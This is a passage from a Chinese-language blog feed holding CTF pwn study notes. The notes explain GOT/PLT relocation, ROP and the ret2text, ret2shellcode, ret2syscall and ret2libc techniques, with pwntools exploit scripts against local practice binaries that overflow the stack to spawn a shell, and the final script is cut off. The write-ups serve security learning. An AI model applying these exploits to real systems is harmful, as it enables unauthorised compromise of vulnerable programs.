punctuation">.</span>ANTIALIAS<span class="token punctuation">)</span>    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>path<span class="token operator">+</span>i<span class="token operator">+</span><span class="token string">'.png'</span><span class="token punctuation">)</span>    out<span class="token punctuation">.</span>save<span class="token punctuation">(</span>path<span class="token operator">+</span>i<span class="token operator">+</span><span class="token string">'.png'</span><span class="token punctuation">,</span> <span class="token string">'png'</span><span class="token punctuation">)</span>imgs <span class="token operator">=</span> <span class="token punctuation">[</span>Image<span class="token punctuation">.</span>open<span class="token punctuation">(</span>path<span class="token operator">+</span>i<span class="token operator">+</span><span class="token string">'.png'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> list_im<span class="token punctuation">]</span>target <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>width<span class="token operator">*</span>column<span class="token punctuation">,</span> height<span class="token operator">*</span>row_num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>list_im<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">%</span> column <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        end <span class="token operator">=</span> len<span class="token punctuation">(</span>list_im<span class="token punctuation">)</span> <span class="token keyword">if</span> i <span class="token operator">+</span> column <span class="token operator">></span> len<span class="token punctuation">(</span>list_im<span class="token punctuation">)</span> <span class="token keyword">else</span> i <span class="token operator">+</span> column         <span class="token keyword">for</span> col<span class="token punctuation">,</span> image <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>imgs<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span>column<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            target<span class="token punctuation">.</span>paste<span class="token punctuation">(</span>image<span class="token punctuation">,</span> <span class="token punctuation">(</span>width<span class="token operator">*</span>col<span class="token punctuation">,</span> height<span class="token operator">*</span><span class="token punctuation">(</span>i<span class="token operator">//</span>column<span class="token punctuation">)</span><span class="token punctuation">,</span>                                  width<span class="token operator">*</span><span class="token punctuation">(</span>col <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> height<span class="token operator">*</span><span class="token punctuation">(</span>i<span class="token operator">//</span>column <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   target<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从ret2libc中学习GOT表和PLT表以及动态计算偏移</title>
      <link href="/2019/09/18/cong-ret2libc-zhong-xue-xi-got-biao-he-plt-biao-yi-ji-dong-tai-ji-suan-pian-yi/"/>
      <url>/2019/09/18/cong-ret2libc-zhong-xue-xi-got-biao-he-plt-biao-yi-ji-dong-tai-ji-suan-pian-yi/</url>
      
        <content type="html"><![CDATA[<h3 id="所谓教材-就是把一个简单易懂的名词-扩写成一堆谁也看不懂的句子（假的"><a href="#所谓教材-就是把一个简单易懂的名词-扩写成一堆谁也看不懂的句子（假的" class="headerlink" title="所谓教材:就是把一个简单易懂的名词,扩写成一堆谁也看不懂的句子（假的"></a>所谓教材:就是把一个简单易懂的名词,扩写成一堆谁也看不懂的句子（假的</h3><h4 id="1-重定位"><a href="#1-重定位" class="headerlink" title="1.重定位"></a>1.重定位</h4><p>确定程序运行时地址的过程就是这里重定位(Relocation)。</p><h4 id="2-链接时重定位"><a href="#2-链接时重定位" class="headerlink" title="2.链接时重定位"></a>2.链接时重定位</h4><p>链接阶段是将一个或多个中间文件(.o文件)通过链接器将它们链接成一个可执行文件，主要做的事情有</p><pre><code>对各个中间文件的同名section进行合并对代码段，数据段等进行地址分配进行链接时重定位</code></pre><a id="more"></a><p>两种情况：</p><p>1.如果是在其他中间文件中已经定义了的函数，链接阶段可以直接重定位到函数地址<br>2.如果是在动态库中定义了的函数，链接阶段无法直接重定位到函数地址，只能生成额外的小片段代码，也就是PLT表，然后重定位到该代码片段</p><h4 id="3、运行时重定位"><a href="#3、运行时重定位" class="headerlink" title="3、运行时重定位"></a>3、运行时重定位</h4><p>运行后加载动态库，把动态库中的相应函数地址填入GOT表，由于PLT表是跳转到GOT表的，这就构成了运行时重定位</p><h4 id="4、PLT表和GOT表"><a href="#4、PLT表和GOT表" class="headerlink" title="4、PLT表和GOT表"></a>4、PLT表和GOT表</h4><p>动态编译其实就是在实际内存中一份，但是在各进程的虚拟地址中“虚拟”一份，这样可以大大节省空间，但是这样会导致重定位非常困难，一个解决方法是给一种动态库一个确定的虚拟内存区，但是这样肯定是不行的（如果动态库很多，内存爆了233，所以有这么一个位置无关代码（PIC），而PLT表和GOT表就是用来无论这个动态库丢内存哪个区域都能调用到。有一个原则是代码段（PLT表）原则上是不能修改的，只能改数据段（GOT表）<br>ELF将GOT拆为了两个表叫做“.got”,”.got.plt”。其中 .got 用来保存全局变量的引用地址，.got.plt 用来保存函数引用的地址<br><img src="1.webp" alt=""></p><h5 id="萌新问题1、不要GOT表可不可以"><a href="#萌新问题1、不要GOT表可不可以" class="headerlink" title="萌新问题1、不要GOT表可不可以"></a>萌新问题1、不要GOT表可不可以</h5><p><code>意思是plt表直接保存</code>jmp *地址<code>肯定是不行的，因为plt是代码段，我们尽量不让他修改</code></p><h5 id="萌新问题2、不要PLT表可不可以"><a href="#萌新问题2、不要PLT表可不可以" class="headerlink" title="萌新问题2、不要PLT表可不可以"></a>萌新问题2、不要PLT表可不可以</h5><p><code>也是不行的，因为GOT表是数据段，不能实现函数跳转等操作</code><br>当然延迟绑定的实现具体细节还是很复杂但是很精妙的，感兴趣可以看看程序员自我修养。</p><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置(即函数对应的 got表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p><pre><code>ROPgadget --binary ret2libc1 --string &#39;/bin/sh&#39;   </code></pre><p><img src="2.png" alt=""><br>payload的布局结构：</p><pre><code>A*N + system_addr + fake_ret + system_arg</code></pre><p>fake_ret是下一次调用的返回地址</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2libc1'</span><span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> <span class="token number">0x8048720</span>system_plt <span class="token operator">=</span> <span class="token number">0x08048460</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">112</span><span class="token punctuation">,</span> system_plt<span class="token punctuation">,</span> <span class="token string">'b'</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">,</span> binsh_addr<span class="token punctuation">]</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h3><p>该题目与例 1 基本一致，只不过不再出现 /bin/sh 字符串，但是有一个puts函数，我们写到bss段，然后执行</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2libc2'</span><span class="token punctuation">)</span>system <span class="token operator">=</span> <span class="token number">0x08048490</span>gets_addr<span class="token operator">=</span><span class="token number">0x08048460</span>pop_ebx <span class="token operator">=</span> <span class="token number">0x0804843d</span>buff2_addr<span class="token operator">=</span><span class="token number">0x0804A080</span><span class="token comment" spellcheck="true">#payload = flat(["a"*112,gets_addr,pop_ebx,buf2,system,"aaaa",buf2])</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">112</span><span class="token punctuation">,</span>gets_addr<span class="token punctuation">,</span>system<span class="token punctuation">,</span>buff2_addr<span class="token punctuation">,</span>buff2_addr<span class="token punctuation">]</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>为甚么两个payload都可以呢<br>payload1:调用写函数之后，函数到了返回地址上，但是栈还多了上一次的参数buf2，所以我们找一个pop把栈平衡一下到达system函数调用，buf2重新作为参数，之后返回地址为“aaaa”,由于全程没动ebp，所以不需要管保留的ebp什么的<br>payload2:在 gets() 函数调用完后，在返回地址处覆盖上 system() 的地址将 gets() 函数的参数 buf 地址当成返回地址，再在后面加上 system() 函数的参数 buf。</p><h3 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h3><p>这题就要先泄露libc地址<br>思路</p><pre><code>1.泄露 一个调用函数的 地址2.获取 libc 版本3.获取 system 地址与 /bin/sh 的地址4.再次执行源程序5.触发栈溢出执行 system(‘/bin/sh’)</code></pre><p>获取libc版本使用LibcSearcher<br>payload</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./ret2libc3"</span><span class="token punctuation">)</span>ret2libc3<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./ret2libc3"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>ret2libc3<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'f'</span><span class="token operator">*</span><span class="token number">112</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ret2libc3<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ret2libc3<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ret2libc3<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span> sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>puts<span class="token operator">=</span>u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'puts的地址'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libc的版本："</span><span class="token operator">+</span>str<span class="token punctuation">(</span>libc<span class="token punctuation">)</span><span class="token punctuation">)</span>libcbase<span class="token operator">=</span>puts<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libc基址:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>system<span class="token operator">=</span>libcbase<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>bin_sh<span class="token operator">=</span>libcbase<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system函数地址:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bin_sh地址:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'f'</span><span class="token operator">*</span><span class="token number">104</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print(main)</span></code></pre><p>解释<br>我们先找到puts函数的plt表，这样可以直接调用puts函数输出我们要看的东西<br>puts参数为<code>p32(ret2libc3.got[&#39;puts&#39;])</code>,我们在每次运行的时候把got表中的puts(其实是一个指针)，输出，这样就把puts函数在这个进程的虚拟地址输出了，然后在一个动态库中相对偏移是不变的，找到system和<code>&#39;/bin/sh&#39;</code>虚拟地址。<br>我们在输出的时候把返回地址设置为main函数就可以再次运行栈溢出而且动态库在虚拟地址中位置不变（Orz太精妙了</p><h3 id="动态调整栈的长度"><a href="#动态调整栈的长度" class="headerlink" title="动态调整栈的长度"></a>动态调整栈的长度</h3><p>之前静态计算栈溢出的偏移，太难了容易算错，然后曹师傅说动态调试就简单了<br>1、先略微调高一点<br>2、设置断点在ret上<br>3、运行，断点截住后查看栈多出了多少<br>比如本题的104，先设置为110<br>然后发现多了6个f字符，所以实际偏移为110-6=104<br><img src="3.png" alt=""></p><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。<br>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell<br>其中，该程序是 32 位，所以我们需要使得</p><pre><code>系统调用号，即 eax 应该为 0xb第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。第二个参数，即 ecx 应该为 0第三个参数，即 edx 应该为 0</code></pre><p>寻找 gadgets的方法，我们可以使用 ropgadgets 这个工具</p><pre><code>ROPgadget --binary rop  --only &#39;pop|ret&#39; | grep &#39;eax&#39;ROPgadget --binary rop  --only &#39;pop|ret&#39; | grep &#39;ebx&#39;ROPgadget --binary rop  --string &#39;/bin/sh&#39; ROPgadget --binary rop  --only &#39;int&#39;</code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./rop'</span><span class="token punctuation">)</span>pop_eax_ret <span class="token operator">=</span> <span class="token number">0x080bb196</span>pop_edx_ecx_ebx_ret <span class="token operator">=</span> <span class="token number">0x0806eb90</span>int_0x80 <span class="token operator">=</span> <span class="token number">0x08049421</span>binsh <span class="token operator">=</span> <span class="token number">0x80be408</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>    <span class="token punctuation">[</span><span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">112</span><span class="token punctuation">,</span> pop_eax_ret<span class="token punctuation">,</span> <span class="token number">0xb</span><span class="token punctuation">,</span> pop_edx_ecx_ebx_ret<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> binsh<span class="token punctuation">,</span> int_0x80<span class="token punctuation">]</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>ps:几个DGB常用命令</p><pre><code>-q 参数不显示欢迎信息等-n 不加载任何插件，使用原生 gdbinfo 后面跟上想要查看的信息，如函数信息 info functionsb/breakpoint 设置断点del/delete breakpoints n 删除断点，n是断点编号，可用info breakpoints命令查看断点信息start 命令启动程序并停在开辟完主函数栈帧的地方c/continue 继续执行程序，遇到断点停下f/finish 结束程序r/run 运行程序，遇到断点停下ni 单步步过，一步一步执行指令遇到函数调用时直接执行完整个函数si 单步步入，一步一步执行指令遇到函数调用时跳转到函数内部vmmap 查看内存映射checksec 查看程序的防护措施pdisass/disassemble 查看当前函数帧的反汇编代码，前一个命令有高亮显示只是需要安装pwndbg插件，后面一个命令时gdb自带的命令无高亮显示p/print 打印信息，如寄存器 p $ebpx/&lt;n/f/u&gt; &lt;addr&gt; 查看某地址处的值，n/f/u 参数为可选，n代表想要查看多少个内存单元即从当前地址开始计算，每个内存单元的大小由后面的u参数指定；f表示显示格式，如s表示字符串形式，i为指令形式；u指定内存单元大小，b(一个字节)、h(双字节)、w(四个字节)、g(八字节)默认为w； 后面跟上x代表以十六进制的形式查看变量set *addr = value 设置某个地址的值</code></pre><p>ps:read函数</p><pre><code>ssize_t read(int fd, void *buf, size_t count);</code></pre><p>函数的参数【int fd】：这个是文件指针<br>函数的参数【void *buf】：读上来的数据保存在缓冲区buf中，同时文件的当前读写位置向后移<br>函数的参数【size_t count】：是请求读取的字节数。若参数count 为0, 则read()不会有作用并返回0. 返回值为实际读取到的字节数, 如果返回0<br>read()会把参数fd 所指的文件传送count个字节到buf指针所指的内存中</p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn入门基础</title>
      <link href="/2019/09/14/pwn-de-yi-xie-bi-ji/"/>
      <url>/2019/09/14/pwn-de-yi-xie-bi-ji/</url>
      
        <content type="html"><![CDATA[<h3 id="一、ROP思想"><a href="#一、ROP思想" class="headerlink" title="一、ROP思想"></a>一、ROP思想</h3><p>在栈缓冲区溢出的基础上，利用程序中已有的小片段( gadgets )来改变某些寄存器或者变量的值，从而控制程序的执行流程，所谓gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程<br>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p><ol><li>程序存在溢出，并且可以控制返回地址。</li><li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li></ol><a id="more"></a><p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了</p><h3 id="二、Linux-Pwn的一些操作"><a href="#二、Linux-Pwn的一些操作" class="headerlink" title="二、Linux-Pwn的一些操作"></a>二、Linux-Pwn的一些操作</h3><h4 id="1、checksec-工具检查编译出的文件"><a href="#1、checksec-工具检查编译出的文件" class="headerlink" title="1、checksec 工具检查编译出的文件"></a>1、checksec 工具检查编译出的文件</h4><pre class=" language-shell"><code class="language-shell">kitty@ubuntu:~/桌面/pwn$ checksec stack-example[*] '/home/kitty/\xe6\xa1\x8c\xe9\x9d\xa2/pwn/stack-example'    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>1.Canary（栈保护）<br>这个选项表示栈保护功能有没有开启。<br>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p><p>2.NX/DEP（堆栈不可执行）<br>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p><p>3.PIE/ASLR（地址随机化）</p><p>4.Fortify<br>这个保护机制查了很久都没有个很好的汉语形容，根据我的理解它其实和栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。由于并不是太常见，也没有太多的了解。<br>5.RelRO<br>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。</p><h4 id="2、readelf-objdump"><a href="#2、readelf-objdump" class="headerlink" title="2、readelf/objdump"></a>2、readelf/objdump</h4><p><code>readelf -h ret2text</code>查看头信息<br><code>readelf -S ret2text</code>显示节区表内的所有信息，包括每个节的属性<br><code>readelf -S ret2text</code>显示节区表内的所有信息，包括每个节的属性<br><code>readelf -t ret2text</code>用来显示所有节的详细信息<br><code>readelf -l ret2text</code>显示程序头表信息，包扩有几个段，每个段的属性<br><code>readelf -r ret2libc1</code>显示所有重定位入口的信息<br><code>objdump -s ret2text</code>显示指定section的完整内容<br><code>objdump -h ret2text</code>显示目标文件各个段的头部摘要信息：<br><code>objdump -d ret2text</code>显示汇编： </p><h4 id="3、GDB"><a href="#3、GDB" class="headerlink" title="3、GDB"></a>3、GDB</h4><p>断点<br><code>pwndbg&gt; b *0x80486AE</code><br>运行<br><code>pwndbg&gt; r</code></p><h4 id="4、查看段读写权限"><a href="#4、查看段读写权限" class="headerlink" title="4、查看段读写权限"></a>4、查看段读写权限</h4><pre><code>gdb&gt; b maingdb&gt; rgdb&gt; vmmap</code></pre><h4 id="5、ROPgadget"><a href="#5、ROPgadget" class="headerlink" title="5、ROPgadget"></a>5、ROPgadget</h4><p>寻找gadget</p><pre class=" language-shell"><code class="language-shell">kitty@ubuntu:~/桌面$ ROPgadget --binary rop --only 'pop|ret'|grep 'eax'0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret0x080bb196 : pop eax ; ret0x0807217a : pop eax ; ret 0x80e0x0804f704 : pop eax ; ret 30x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</code></pre><p>查字符串</p><pre class=" language-shell"><code class="language-shell">kitty@ubuntu:~/桌面$ ROPgadget --binary rop --string '/bin/sh'Strings information============================================================0x080be408 : /bin/sh</code></pre><p>寻找int 0x80 的地址</p><pre class=" language-shell"><code class="language-shell">kitty@ubuntu:~/桌面$ ROPgadget --binary rop --only 'int'Gadgets information============================================================0x08049421 : int 0x800x080938fe : int 0xbb0x080869b5 : int 0xf60x0807b4d4 : int 0xfcUnique gadgets found: 4</code></pre><h3 id="三、IDA的操作"><a href="#三、IDA的操作" class="headerlink" title="三、IDA的操作"></a>三、IDA的操作</h3><h4 id="1、查看栈结构"><a href="#1、查看栈结构" class="headerlink" title="1、查看栈结构"></a>1、查看栈结构</h4><p>双击变量即可</p><h4 id="2、查看段"><a href="#2、查看段" class="headerlink" title="2、查看段"></a>2、查看段</h4><p>ctrl+S</p><h3 id="四、一些经典的题目"><a href="#四、一些经典的题目" class="headerlink" title="四、一些经典的题目"></a>四、一些经典的题目</h3><h4 id="1、stack-example"><a href="#1、stack-example" class="headerlink" title="1、stack-example"></a>1、stack-example</h4><p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，当然需要确保这个地址所在的段具有可执行权限</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">##coding=utf8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">## 构造与程序交互的对象</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./stack_example'</span><span class="token punctuation">)</span>success_addr <span class="token operator">=</span> <span class="token number">0x0804843b</span><span class="token comment" spellcheck="true">## 构造payload</span>payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x14</span> <span class="token operator">+</span> <span class="token string">'bbbb'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>success_addr<span class="token punctuation">)</span><span class="token keyword">print</span> p32<span class="token punctuation">(</span>success_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">## 向程序发送字符串</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true">## 将代码交互转换为手工交互</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="2、ret2text"><a href="#2、ret2text" class="headerlink" title="2、ret2text"></a>2、ret2text</h4><p>ret2text 即控制程序执行程序本身已有的的代码(.text)</p><pre><code>.text:080486A7                 lea     eax, [esp+80h+s] //其中s为-0x6480486a7:    8d 44 24 1c              lea    0x1c(%esp),%eax</code></pre><p>所以偏移地址计算方式<br><img src="1.png" alt=""><br><img src="2.png" alt=""></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">##!/usr/bin/env python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2text'</span><span class="token punctuation">)</span>target <span class="token operator">=</span> <span class="token number">0x804863a</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x6c</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="3、ret2shellcode"><a href="#3、ret2shellcode" class="headerlink" title="3、ret2shellcode"></a>3、ret2shellcode</h4><p>ret2shellcode，即控制程序执行 shellcode代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2shellcode'</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>buf2_addr <span class="token operator">=</span> <span class="token number">0x804a080</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>buf2_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>bss可执行后，把shellcode放到bss段</p><h4 id="4、利用gadgets来getshell"><a href="#4、利用gadgets来getshell" class="headerlink" title="4、利用gadgets来getshell"></a>4、利用gadgets来getshell</h4><p>只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell</p><pre><code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></pre><p>其中，该程序是 32 位，所以我们需要使得</p><pre><code>系统调用号，即 eax 应该为 0xb第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。第二个参数，即 ecx 应该为 0第三个参数，即 edx 应该为 0</code></pre><p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了pop eax，那么现在 eax 的值就为 10。<br>ps:</p><pre><code>ret 不加参数 相当于 用栈中的数据，修改IP的内容 pop IP</code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> base64context<span 